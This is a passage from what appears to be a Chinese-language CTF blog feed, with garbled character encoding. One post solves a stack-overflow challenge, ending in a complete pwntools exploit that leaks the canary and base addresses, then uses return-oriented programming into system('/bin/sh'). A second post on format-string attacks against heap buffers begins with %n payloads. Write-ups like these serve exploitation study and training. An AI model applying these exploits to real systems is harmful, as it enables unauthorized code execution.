0x555555555150 &lt;exit@plt&gt;</span><br><span class="line">0x00005555555552e0 &lt;+151&gt;:   mov    QWORD PTR [rbp-0x40],0x0</span><br><span class="line">0x00005555555552e8 &lt;+159&gt;:   mov    QWORD PTR [rbp-0x38],0x0</span><br><span class="line">0x00005555555552f0 &lt;+167&gt;:   mov    QWORD PTR [rbp-0x30],0x0</span><br><span class="line">0x00005555555552f8 &lt;+175&gt;:   mov    QWORD PTR [rbp-0x28],0x0</span><br><span class="line">0x0000555555555300 &lt;+183&gt;:   mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">0x0000555555555308 &lt;+191&gt;:   mov    QWORD PTR [rbp-0x18],0x0</span><br><span class="line">0x0000555555555310 &lt;+199&gt;:   mov    rdx,QWORD PTR [rbp-0x58]</span><br><span class="line">0x0000555555555314 &lt;+203&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">0x0000555555555318 &lt;+207&gt;:   mov    esi,0x20</span><br><span class="line">0x000055555555531d &lt;+212&gt;:   mov    rdi,rax</span><br><span class="line">0x0000555555555320 &lt;+215&gt;:   call   0x555555555110 &lt;fgets@plt&gt;</span><br><span class="line">0x0000555555555325 &lt;+220&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">0x0000555555555329 &lt;+224&gt;:   mov    rdi,rax</span><br><span class="line">0x000055555555532c &lt;+227&gt;:   call   0x5555555550d0 &lt;puts@plt&gt;</span><br><span class="line">0x0000555555555331 &lt;+232&gt;:   nop</span><br><span class="line">0x0000555555555332 &lt;+233&gt;:   mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">0x0000555555555336 &lt;+237&gt;:   xor    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000055555555533f &lt;+246&gt;:   je     0x555555555346 &lt;win+253&gt;</span><br><span class="line">0x0000555555555341 &lt;+248&gt;:   call   0x5555555550e0 &lt;__stack_chk_fail@plt&gt; ;æ£€æµ‹canary</span><br><span class="line">0x0000555555555346 &lt;+253&gt;:   leave  </span><br><span class="line">0x0000555555555347 &lt;+254&gt;:   ret </span><br></pre></td></tr></table></figure><ol start="3"><li><p>æˆ‘ä»¬æŠŠæ–­ç‚¹æ–­åˆ°leave retå¤„  å‘ç°rbpæŒ‡å‘å°±æ˜¯æˆ‘ä»¬retçš„ä¸‹æ–¹ï¼Œå¦‚æœæˆ‘ä»¬æŠŠretä¸‹æ–¹è¦†ç›–ä¸ºflaçš„è¯ï¼Œåªéœ€è¦æŠŠåŸæ¥çš„æ ˆæé«˜0x6c,(0x0000555555555263 &lt;+26&gt;:    mov    BYTE PTR [rbp-0x6c],al )å°±å¯ä»¥ä¼ªé€ æ ˆï¼Œä¼ªé€ flag.txtï¼Œæ•…payloadä¸º <em>payload&#x3D;bâ€™aâ€™*10+p64(canary)+p64(rbp_ad+0x6c)+p64(win_ad)+bâ€™a\x00\x00\x00â€™+bâ€™l\x00\x00\x00â€™+bâ€™f\x00\x00\x00â€™</em></p><p><img src="/2023/02/16/23-2-16/image-20230217000537025.png" alt="image-20230217000537025"></p></li></ol><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b* $rebase(0x138E)&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;like ctf?&#x27;</span>,padding)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_ad=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp_ad))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Do you like ctf?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">ret_ad=<span class="number">0x1447</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-ret_ad</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line">win_ad=<span class="number">0x1273</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x6c</span>)+p64(win_ad)+<span class="string">b&#x27;a\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;l\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;f\x00\x00\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="å†æ¢"><a href="#å†æ¢" class="headerlink" title="å†æ¢"></a>å†æ¢</h2><p>å®˜æ–¹çš„é—®é¢˜ï¼Œå‰ä¸€ä¸ªexpæ²¡æ‰“é€šï¼Œå¥‡æ€ªäº†ï¼Œéš¾é“åå­—ä¸å«flag.txtï¼Ÿï¼Œæˆ–è®¸å«flagï¼Œåˆå¼€å§‹åˆ†æwinæ±‡ç¼–ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ§åˆ¶æ ˆå’Œrsp,åˆä»ä¸‹é¢æ±‡ç¼–çš„&lt;+62&gt;æˆ–è€…&lt;+99&gt;å¯ä»¥çœ‹å‡ºè¦æ‰“å¼€çš„æ–‡ä»¶åå­—çš„å­˜å‚¨åœ°å€ä¸ºrbp-0x4aå¤„ï¼Œå¹²å˜›ä¸ç›´æ¥è¦†ç›–è¿™é‡Œï¼Œè¿™æ ·æˆ‘ä»¬è¿˜å¯ä»¥æ§åˆ¶æ–‡ä»¶åå­—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555283 &lt;+58&gt;:    movzx  eax,BYTE PTR [rbp-0x64]            ;å‚æ•°è½¬ç§»</span><br><span class="line">0x0000555555555287 &lt;+62&gt;:    mov    BYTE PTR [rbp-0x4a],al    f</span><br><span class="line">0x000055555555528a &lt;+65&gt;:    movzx  eax,BYTE PTR [rbp-0x68]    </span><br><span class="line">0x000055555555528e &lt;+69&gt;:    mov    BYTE PTR [rbp-0x49],al    l</span><br><span class="line">0x0000555555555291 &lt;+72&gt;:    movzx  eax,BYTE PTR [rbp-0x6c]  a        ;ä»è¿™é‡Œå€’æ¨å³å¯</span><br><span class="line">0x0000555555555295 &lt;+76&gt;:    mov    BYTE PTR [rbp-0x48],al</span><br><span class="line">0x0000555555555298 &lt;+79&gt;:    mov    BYTE PTR [rbp-0x47],0x67        </span><br><span class="line">0x000055555555529c &lt;+83&gt;:    mov    BYTE PTR [rbp-0x46],0x2e</span><br><span class="line">0x00005555555552a0 &lt;+87&gt;:    mov    BYTE PTR [rbp-0x45],0x74</span><br><span class="line">0x00005555555552a4 &lt;+91&gt;:    mov    BYTE PTR [rbp-0x44],0x78</span><br><span class="line">0x00005555555552a8 &lt;+95&gt;:    mov    BYTE PTR [rbp-0x43],0x74</span><br><span class="line">0x00005555555552ac &lt;+99&gt;:    lea    rax,[rbp-0x4a]</span><br><span class="line">0x00005555555552b0 &lt;+103&gt;:   lea    rsi,[rip+0xd51]        # 0x555555556008</span><br><span class="line">0x00005555555552b7 &lt;+110&gt;:   mov    rdi,rax</span><br><span class="line">0x00005555555552ba &lt;+113&gt;:   call   0x555555555140 &lt;fopen@plt&gt;</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>æŠŠå‰ä¸€ä¸ªexpçš„</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">win_ad=<span class="number">0x1273</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x6c</span>)+p64(win_ad)+<span class="string">b&#x27;a\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;l\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;f\x00\x00\x00&#x27;</span></span><br><span class="line">æ›¿æ¢ä¸º</span><br><span class="line">win_ad=<span class="number">0x012AC</span>+base </span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x4a</span>)+p64(win_ad)+<span class="string">b&#x27;flag.txt\x00&#x27;</span> <span class="comment">#flag.txtæ–‡ä»¶åå­—å¯ä»¥æ”¹æˆæˆ‘ä»¬æƒ³æ‰“å¼€çš„åå­—</span></span><br></pre></td></tr></table></figure><h2 id="å¾ˆç”Ÿæ°”å‘€ï¼Œæ‹¿tmçš„shell"><a href="#å¾ˆç”Ÿæ°”å‘€ï¼Œæ‹¿tmçš„shell" class="headerlink" title="å¾ˆç”Ÿæ°”å‘€ï¼Œæ‹¿tmçš„shell"></a>å¾ˆç”Ÿæ°”å‘€ï¼Œæ‹¿tmçš„shell</h2><p>æœ¬åœ°ä¹Ÿé€šäº†ï¼Œè¿œç¨‹è¿˜æ˜¯ä¸è¡Œï¼Œè¯•äº†å¥½å‡ ä¸ªæ–‡ä»¶åå­—è¿˜ä¸è¡Œï¼Œå†…å¿ƒå¼€å§‹æ€€ç–‘ï¼Œä¹Ÿä¸æƒ³å°±è¿™æ ·æ”¾å¼ƒï¼Œç»§ç»­åˆ†æå‘ç°å¯ä»¥ç›´æ¥æ‹¿shell</p><p>å’Œå‰é¢ä¸€æ ·å…ˆæ³„éœ²canary rbp å’ŒpieåŸºå€ï¼Œç¨‹åºæœ‰ä½¿ç”¨putså‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨putsæ³„éœ²putsåœ°å€ï¼Œç”±äºæ˜¯64ä¸ºéœ€è¦ä¸€ä¸ªpop rdiçš„gadgetç»™putsä¼ å‚</p><p><img src="/2023/02/16/23-2-16/image-20230217002642059.png" alt="image-20230217002642059"></p><p>payload&#x3D;bâ€™aâ€™*10+p64(canary)+bâ€™deadbeefâ€™+p64(poprdi)+p64(puts_got)+p64(puts_plt)+p64(getFeedback)</p><p>è¿™é‡Œå†æ¬¡è¿”å›canaryæ˜¯ä¸ä¼šå˜å¾—ï¼Œå³ä½¿æ˜¯å†æ¬¡ç”Ÿæˆï¼›å˜äº†çš„è¯ä¹Ÿå¥½è¯´ï¼Œåœ¨æ³„éœ²ä¸€æ¬¡å°±æ˜¯äº†ï¼Œæˆ–è€…ropè¿”å›æ—¶è·³è¿‡ç”Ÿæˆ</p><p>æ³„éœ²åæ‰¾åˆ°libcï¼Œå°±å¯ä»¥å¸¸è§„rop</p><p>payload&#x3D;bâ€™aâ€™*10+p64(canary)+bâ€™deadbeefâ€™+p64(poprdi)+p64(bin_sh)+p64(ret)+p64(system_ad)</p><p>è¿™é‡Œåœ¨retåˆ°systemå‰å¤šä¸ªretæ˜¯ä¸ºäº†ubuntu18ç‰ˆæœ¬ä»¥ä¸Šè°ƒç”¨64ä½ç¨‹åºä¸­çš„systemå‡½æ•°çš„æ ˆå¯¹é½é—®é¢˜</p><blockquote><p>64ä½ä¸‹systemå‡½æ•°æœ‰ä¸ªmovapsæŒ‡ä»¤ï¼Œè¿™ä¸ªæŒ‡ä»¤è¦æ±‚å†…å­˜åœ°å€å¿…é¡»16å­—èŠ‚å¯¹é½,å› ä¸º64ä½ç¨‹åºçš„åœ°å€æ˜¯8å­—èŠ‚çš„ï¼Œè€Œåå…­è¿›åˆ¶åˆæ˜¯æ»¡16å°±ä¼šè¿›ä½ï¼Œå› æ­¤æˆ‘ä»¬çœ‹åˆ°çš„æ ˆåœ°å€æœ«å°¾è¦ä¹ˆæ˜¯0è¦ä¹ˆæ˜¯8ã€‚</p><p>åªæœ‰å½“åœ°å€çš„æœ«å°¾æ˜¯0çš„æ—¶å€™ï¼Œæ‰ç®—æ˜¯ä¸16å­—èŠ‚å¯¹é½äº†ï¼Œå¦‚æœæœ«å°¾æ˜¯8çš„è¯ï¼Œé‚£å°±æ˜¯æ²¡æœ‰å¯¹é½ã€‚è€Œæˆ‘ä»¬æƒ³è¦åœ¨ubuntu18ä»¥ä¸Šçš„64ä½ç¨‹åºä¸­æ‰§è¡Œsystemå‡½æ•°ï¼Œå¿…é¡»è¦åœ¨æ‰§è¡Œsystemæ ˆé¡¶åœ°å€æœ«å°¾æ˜¯0ã€‚</p></blockquote><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b* $rebase(0x138E)&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;like ctf?&#x27;</span>,padding)</span><br><span class="line"><span class="comment"># print(io.recv())</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_ad=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp_ad))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Do you like ctf?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">ret_ad=<span class="number">0x1447</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-ret_ad</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment"># print(&quot;base&quot;+hex(base))</span></span><br><span class="line">poprdi=<span class="number">0x014d3</span>+base</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]+base</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]+base</span><br><span class="line">getFeedback=base+elf.symbols[<span class="string">&#x27;getFeedback&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(getFeedback))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(poprdi)+p64(puts_got)+p64(puts_plt)+p64(getFeedback)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_ad&quot;</span>+<span class="built_in">hex</span>(puts_ad))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base_libc=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="comment"># base_libc=puts_ad-0x067970</span></span><br><span class="line">system_ad=base_libc+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># system_ad=base_libc+0x03f650</span></span><br><span class="line">bin_sh=base_libc+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># bin_sh=base_libc+0x163ef7</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">ret=base+<span class="number">0x0101a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system&quot;</span>+<span class="built_in">hex</span>(system_ad))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin&quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret&quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(poprdi)+p64(bin_sh)+p64(ret)+p64(system_ad)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Can you provide some extra feedback?\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shellï¼Œå‘ç°æ–‡ä»¶é‡Œæœ‰flag.txtï¼Œæ‹¿åˆ°flagï¼Œè¿˜åœ¨ç–‘æƒ‘å‰ä¸¤ä¸ªä¸ºä»€ä¹ˆä¸è¡Œï¼Œåˆå»è¯•äº†ä¸€ä¸‹å‰ä¸¤ä¸ªexpï¼Œè¿™æ¬¡å‘ç°éƒ½èƒ½æ‰“é€šï¼Œæˆ‘â€¦.</p><h2 id="æ€»ç»“-æœ‰å¾—æœ‰å¤±"><a href="#æ€»ç»“-æœ‰å¾—æœ‰å¤±" class="headerlink" title="æ€»ç»“:æœ‰å¾—æœ‰å¤±"></a>æ€»ç»“:æœ‰å¾—æœ‰å¤±</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éæ ˆä¸Šçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</title>
      <link href="/2023/02/12/pwn/"/>
      <url>/2023/02/12/pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç‚¹ä¸åœ¨æ ˆä¸Šæ€ä¹ˆæ‰“"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç‚¹ä¸åœ¨æ ˆä¸Šæ€ä¹ˆæ‰“" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç‚¹ä¸åœ¨æ ˆä¸Šæ€ä¹ˆæ‰“"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç‚¹ä¸åœ¨æ ˆä¸Šæ€ä¹ˆæ‰“</h1><p><strong>ä¸€èˆ¬åœ¨æ ˆä¸Šçš„æ ¼å¼ä¼šå­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæ³„éœ²å¯¼è‡´æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å‡½æ•°çš„gotè¡¨ï¼Œç„¶ååˆ©ç”¨%$hhnè¿›è¡Œä¸€ä¸ªä¸€ä¸ªbyteçš„å†™å…¥ï¼Œpayloadè‡ªå·±å¯ä»¥å†™å‡½æ•°å»ç”Ÿæˆï¼Œæˆ–è€…åˆ©ç”¨pwntoolsåº“çš„fmtstr_payload(,{:})å»è‡ªåŠ¨ç”Ÿæˆï¼Œè‡ªå·±æ„é€ payloadè¦æ³¨æ„payloadæ˜¯å¦æœ‰è¢«â€˜\x00â€™æˆªæ–­ï¼Œå¯¼è‡´åˆ©ç”¨ä¸æˆåŠŸï¼Œè¿™ç§æ–¹æ³•éœ€è¦æˆ‘ä»¬å¯æ§å€¼æ˜¯å­˜å‚¨åœ¨æ ˆä¸Šçš„å‚æ•°ï¼Œä¸åœ¨æ ˆä¸Šæ—¶åº”è¯¥æ€ä¹ˆåŠï¼Ÿä»‹ç»ä¸¤ç§æ–¹æ³•</strong></p><span id="more"></span><h2 id="ç¬¬ä¸€ç§æ–¹æ³•-å°†æ ˆé¡¶esp-rsp-æå‡åˆ°å¯æ§å‚æ•°-è¿›è¡Œrop"><a href="#ç¬¬ä¸€ç§æ–¹æ³•-å°†æ ˆé¡¶esp-rsp-æå‡åˆ°å¯æ§å‚æ•°-è¿›è¡Œrop" class="headerlink" title="ç¬¬ä¸€ç§æ–¹æ³• å°†æ ˆé¡¶esp(rsp)æå‡åˆ°å¯æ§å‚æ•° è¿›è¡Œrop"></a>ç¬¬ä¸€ç§æ–¹æ³• å°†æ ˆé¡¶esp(rsp)æå‡åˆ°å¯æ§å‚æ•° è¿›è¡Œrop</h2><p><strong>é¢˜ç›®é“¾æ¥<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">contacts</a></strong></p><h3 id="æ‹¿åˆ°é¢˜ç›®è¿è¡Œ"><a href="#æ‹¿åˆ°é¢˜ç›®è¿è¡Œ" class="headerlink" title="æ‹¿åˆ°é¢˜ç›®è¿è¡Œ"></a>æ‹¿åˆ°é¢˜ç›®è¿è¡Œ</h3><p><img src="/2023/02/12/pwn/image-20230212164452297.png" alt="image-20230212164452297"></p><h3 id="æŸ¥çœ‹ä¿æŠ¤"><a href="#æŸ¥çœ‹ä¿æŠ¤" class="headerlink" title="æŸ¥çœ‹ä¿æŠ¤"></a>æŸ¥çœ‹ä¿æŠ¤</h3><p><img src="/2023/02/12/pwn/image-20230212164600939.png" alt="image-20230212164600939"></p><h3 id="å¼€å§‹idaåæ±‡ç¼–é™æ€åˆ†æ"><a href="#å¼€å§‹idaåæ±‡ç¼–é™æ€åˆ†æ" class="headerlink" title="å¼€å§‹idaåæ±‡ç¼–é™æ€åˆ†æ"></a>å¼€å§‹idaåæ±‡ç¼–é™æ€åˆ†æ</h3><p>ä¸»å‡½æ•°å°±æ˜¯ä¸€ä¸‹ç®€å•switchï¼ŒPrintInfoå‘ç°æœ‰æˆ‘ä»¬å¯æ§å‚æ•°ï¼Œformatæ˜¯æˆ‘ä»¬è¾“å…¥çš„Descriptionï¼Œä½†æ˜¯å¾ˆé—æ†¾åœ¨å †ä¸Š(å¯ä»¥çœ‹åˆ°æ˜¯åˆ©ç”¨mallocåœ¨å †ä¸Šç”³è¯·)ï¼Œæºç¨‹åºåº”è¯¥æ˜¯ä¸ªcçš„ç»“æ„ä½“</p><p><img src="/2023/02/12/pwn/image-20230212164835416.png" alt="image-20230212164835416"></p><p><img src="/2023/02/12/pwn/image-20230212170204473.png" alt="image-20230212170204473"></p><p>è¿™æ˜¯æˆ‘ä»¬çš„æ€è·¯å¯èƒ½åœ¨æƒ³å¯ä¸å¯ä»¥æ”¹å†™printfçš„gotä¸ºsystemåœ°å€ï¼Œè®©åæ§åˆ¶formatä¸ºâ€˜&#x2F;bin&#x2F;shâ€™ä»è€Œè·å–shellï¼Œå¾ˆé—æ†¾ä¸å¯ä»¥ï¼Œå‚æ•°æ²¡åœ¨æ ˆä¸Šï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨æ”¹å†™è¿”å›åœ°å€ä¸ºsystem_addr + â€˜fakeâ€™ + addr of â€˜&#x2F;bin&#x2F;shâ€˜ ï¼Œæ€æƒ³å¯è¡Œï¼Œç”±äºæ”¹å†™è¿‡ç¨‹éœ€è¦å¤§é‡è¾“å‡ºï¼Œè¡Œä¸ºä¸å¯è¡Œï¼Œä½†æ˜¯æ€æƒ³ç»ˆå½’æ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥æŠŠsystem_addr + â€˜fakeâ€™ + addr of â€˜&#x2F;bin&#x2F;shâ€˜è¾“å…¥åˆ°descriptionï¼Œå†åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ŒæŠŠmainå‡½æ•°è¿”å›æ—¶ä¿å­˜çš„ebpç»™ä¸ºå †ä¸Šdescriptionåœ°å€ï¼Œæ˜¯å¯è¡Œçš„</p><h3 id="gdbåŠ¨æ€è°ƒè¯•å†™exp"><a href="#gdbåŠ¨æ€è°ƒè¯•å†™exp" class="headerlink" title="gdbåŠ¨æ€è°ƒè¯•å†™exp"></a>gdbåŠ¨æ€è°ƒè¯•å†™exp</h3><p>æ²¡æœ‰å¼€pieä¿æŠ¤ï¼Œç›´æ¥b *0x8048C22æŠŠæ–­ç‚¹ä¸‹åˆ°æ¼æ´å¤„åˆ†æ</p><p><img src="/2023/02/12/pwn/image-20230212173223423.png" alt="image-20230212173223423"></p><p>è§‚å¯Ÿæ ˆé‡Œçš„å‚æ•°1å¤„ä¸ºPrintInfoå‡½æ•°ä¿å­˜çš„ebpåœ°å€ï¼Œ2å¤„ä¸ºdescriptionå †ä¸Šåœ°å€ï¼Œ3å¤„ä¸º__libc_start_call_mainè°ƒç”¨å‡½æ•°æ—¶ä¿å­˜çš„è¿”å›åœ°å€ï¼Œåˆ©ç”¨fmtargå¾—åˆ°å„æ ¼å¼åŒ–å‚æ•°åç§»ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡®äº†</p><ol><li>åˆ©ç”¨%31$paaaa æ³„éœ²__libc_start_call_mainï¼Œè®©ååˆ©ç”¨Libcsearchæ³„éœ²ç‰ˆæœ¬å·ï¼ˆASLRä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼ŒåŸå› æ˜¯ä»¥é¡µçš„å¤§å°ä¸ºåŸºç¡€éšæœºï¼Œlinuxä¸€èˆ¬4kï¼‰ï¼Œä»è€Œdumpä¸‹libcé‡Œçš„systemåœ°å€å’Œ&#x2F;bin&#x2F;shåœ°å€ï¼Œè¿™é‡Œç”±äºä¸çŸ¥ååŸå› å¯¼è‡´__libc_start_call_mainä¸è¡Œï¼Œè„šæœ¬é‡Œæ¢æˆäº†æ ¹æ®åç§»libc_start_mainåœ°å€ï¼Œæœ¬åœ°ç»ƒä¹ æ— æ‰€è°“</li><li>bâ€™%6$p%11$pbbbâ€™+p32(system)+bâ€™fakeâ€™+p32(bin_sh)æ³„éœ²descriptionåœ°å€å’Œebpï¼ŒåŒæ—¶å†™å…¥ropéœ€è¦æˆåˆ†</li><li>bâ€™%â€™+str(heap_addr-4).encode()+bâ€™câ€™+bâ€™%6$nâ€™å‘mainå‡½æ•°ebpå†™å…¥descriptionå †åœ°å€<ul><li>ç¨‹åºä¸­å‹å…¥æ ˆä¸­çš„ ebp å€¼å…¶å®ä¿å­˜çš„æ˜¯ä¸Šä¸€ä¸ªå‡½æ•°çš„ä¿å­˜ ebp 